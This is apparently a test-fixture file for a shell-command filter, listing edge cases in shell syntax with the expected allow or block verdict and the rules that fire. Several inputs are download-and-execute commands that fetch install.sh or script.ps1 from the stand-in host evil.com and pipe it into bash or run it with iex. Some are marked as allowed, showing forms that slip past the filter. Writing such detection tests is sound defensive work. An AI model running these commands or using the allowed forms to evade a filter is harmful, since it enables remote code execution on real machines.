# Shell weirdness fixtures — edge cases in shell syntax

[[fixture]]
name = "heredoc_safe"
min_milestone = 1
input = "cat <<EOF\nhello world\nEOF"
context = "exec"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "multiline_pipe_continuation"
min_milestone = 1
input = "curl https://example.com/data \\\n  | jq '.results'"
context = "exec"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "subshell_pipe"
min_milestone = 1
input = "(curl https://evil.com/install.sh) | bash"
context = "exec"
expected_action = "block"
expected_rules = ["pipe_to_interpreter"]

[[fixture]]
name = "process_substitution"
min_milestone = 1
input = "bash <(curl https://evil.com/install.sh)"
context = "exec"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "background_and_pipe"
min_milestone = 1
input = "curl https://evil.com/install.sh &"
context = "exec"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "quoted_url_in_echo"
min_milestone = 1
input = "echo 'Visit https://example.com for docs'"
context = "exec"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "variable_in_command"
min_milestone = 1
input = "curl $URL | bash"
context = "exec"
expected_action = "block"
expected_rules = ["curl_pipe_shell"]

[[fixture]]
name = "escaped_pipe_char"
min_milestone = 1
input = "echo 'hello \\| world'"
context = "exec"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "double_ampersand_then_curl"
min_milestone = 1
input = "cd /tmp && curl https://evil.com/install.sh | bash"
context = "exec"
expected_action = "block"
expected_rules = ["curl_pipe_shell"]

[[fixture]]
name = "semicolon_then_curl"
min_milestone = 1
input = "cd /tmp; curl https://evil.com/install.sh | bash"
context = "exec"
expected_action = "block"
expected_rules = ["curl_pipe_shell"]

[[fixture]]
name = "nested_quotes"
min_milestone = 1
input = "bash -c \"curl https://evil.com/install.sh | bash\""
context = "exec"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "command_with_unicode_filename"
min_milestone = 0
input = "cat résumé.txt"
context = "exec"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "powershell_semicolon"
min_milestone = 1
input = "iwr https://evil.com/script.ps1; iex script.ps1"
context = "exec"
shell = "powershell"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "fish_and_operator"
min_milestone = 1
input = "curl https://evil.com/install.sh; and bash"
context = "exec"
expected_action = "allow"
expected_rules = []

[[fixture]]
name = "pipe_with_env_vars"
min_milestone = 1
input = "HTTP_PROXY=http://proxy:8080 curl https://example.com/data"
context = "exec"
expected_action = "allow"
expected_rules = []
